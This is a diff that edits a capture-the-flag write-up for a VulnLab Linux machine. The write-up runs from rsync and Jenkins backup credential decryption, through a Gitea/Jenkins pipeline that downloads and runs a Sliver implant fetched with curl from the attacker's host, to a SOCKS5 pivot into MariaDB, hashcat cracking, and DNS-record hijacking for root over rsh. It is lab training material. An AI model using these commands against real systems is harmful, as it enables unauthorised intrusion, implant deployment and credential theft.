@@ -10,13 +10,11 @@ categories = ["vulnlab", "ctf", "misconfigurations"]
 tags = ["jenkins", "gitea", "exegol", "sliver", "proxychains", "nmap", "linux", "ctf", "hashcat", "socks5", "misconfigurations", "rsync", "Mariadb", "powerdns"]
 +++
 
-![pwned](build.png)
-
 ## Enumeration
 
-### Nmap scan
+### Nmap Scan
 
-I start with a standard scan using nmap
+I started by performing a standard nmap scan:
 
 ```
 exegol-VulnLab /workspace # nmap -sCV --min-rate 5000 -p- 10.10.104.46
@@ -103,17 +101,14 @@ SF:uest,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/pl
 SF:ain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Requ
 ```
 
-## HTTP - 3000
 
-On port 3000, there is Gitea, which contains 1 public repository
+## HTTP - Port 3000
+
+Port 3000 is running Gitea, which hosts a single public repository.
 
 ### Gitea
 
-![gitea1](gitea1.png)
-
-![gitea2](gitea2.png)
-
-In the public repository, there is a jenkins pipeline
+The public repository contains a Jenkins pipeline configuration.
 
 ## Rsync
 
@@ -125,23 +120,22 @@ rsync -av --list-only rsync://10.10.104.46
 rsync -av --list-only rsync://10.10.104.46/backups/
 ```
 
-![rsync](rsync-jenkins.png)
-
-The machine also has an exposed rsync, which contains a jenkins backup
+The machine also exposes an rsync service, which contains a Jenkins backup.
 
 ```sh
 rsync -av rsync://10.10.104.46/backups ./sdf
 ```
 
+
 ## Backup
 
-### jenkins-credentials-decryptor
+### Jenkins Credentials Decryptor
 
-[![jenkins-creds-decryptor](jcd.png)](https://github.com/hoto/jenkins-credentials-decryptor)
+[
 
 https://github.com/hoto/jenkins-credentials-decryptor
 
-Having access to the Jenkins backup using the `jenkins-credentials-decryptor tool`, I was able to decrypt the password for the user `buildadm`
+With access to the Jenkins backup, I used the `jenkins-credentials-decryptor` tool to decrypt the password for the `buildadm` user.
 
 ```sh
 nix profile install github:hoto/jenkins-credentials-decryptor
@@ -155,15 +149,11 @@ jenkins-credentials-decryptor \
        -o json
 ```
 
+I can now log into Gitea using these credentials.
 
-![backup-dcrypt](jdecrypt.png)
+## Shell Access
 
-
-I can currently log in to Gitea
-
-## Shell access
-
-Next, I decided to upload the sliver implant to the machine through the pipeline
+Next, I uploaded the Sliver implant to the target machine via the pipeline.
 
 ### Sliver
 
@@ -174,6 +164,7 @@ sliver > generate --mtls 10.8.4.230:8888 --os Linux --arch 64
 ```
 sliver > mtls --lport 8888
 ```
+
 
 ### Implant Upload
 
@@ -187,13 +178,11 @@ curl http://10.8.4.230/LAZY_POLO -o /tmp/LAZY_POLO && \
     /tmp/LAZY_POLO
 ```
 
-`http server`
+`HTTP Server`
 
 ```sh
 python3 -m http.server
 ```
-
-![bulidadm/dev](gitea-curl.png)
 
 ```
 sliver > use fff759cb-5de0-49bd-990b-aec6b0a1db35
@@ -203,39 +192,34 @@ sliver > use fff759cb-5de0-49bd-990b-aec6b0a1db35
 sliver (LAZY_POLO) > shell
 ```
 
-I managed to gain access to the shell and get the contents of the first flag
+I successfully gained shell access and retrieved the first flag.
 
-![shell](shell1.png)
+It appears that I am inside a container.
 
-![shell](shell2.png)
-
-Everything indicates that we are inside the container :/
-
-## MySQL server
+## MySQL Server
 
 ```
 3306/tcp filtered mysql
 ```
-Using a proxy, we are able to log in to the MySQL server as root
+
+Using a proxy, I was able to log into the MySQL server as root.
 
 ### Sliver socks5
 
 ```
 sliver (LAZY_POLO) > socks5 start
 ```
-> remember to properly configure proxychains!
+
+> Remember to properly configure proxychains!
 
 ```sh
 proxychains4 mysql -u root -h 172.18.0.1 --skip-ssl
 ```
 
-![mariadb](mariadb1.png)
 
 ### PowerDNS
 
-From the PowerDNS database, we can obtain the administrator password using hashcat
-
-![mariadb](mariadb2.png)
+From the PowerDNS database, I obtained the administrator password using hashcat.
 
 ### hashcat
 
@@ -243,30 +227,23 @@ From the PowerDNS database, we can obtain the administrator password using hashc
 hashcat -a 0 -m 3200 hash.txt /usr/share/wordlists/rockyou.txt
 ```
 
-## Privilege escalation
+
+## Privilege Escalation
 
 ### PowerDNS
 
 ```
 select * from history;
 ```
-![mariadb](mariadb3.png)
 
-In the database, in the `history` table, I found several IP addresses, and under one of them is the PowerDNS admin panel
+In the database's `history` table, I found several IP addresses, and one of them led to the PowerDNS admin panel.
 
 `172.18.0.6`
 
-![powerdns](powerdns1.png)
-
-![powerdns](powerdns2.png)
-
-![powerdns](powerdns3.png)
-
-
-### rsh
+### RSH
 
 ```
 rsh 10.10.104.46
 ```
 
-After setting my own IP address for the `intern` record in the DNS zone and using the `rsh` client, I gain access as `root`
+After setting my own IP address as the `intern` DNS record and using the `rsh` client, I gained root access.
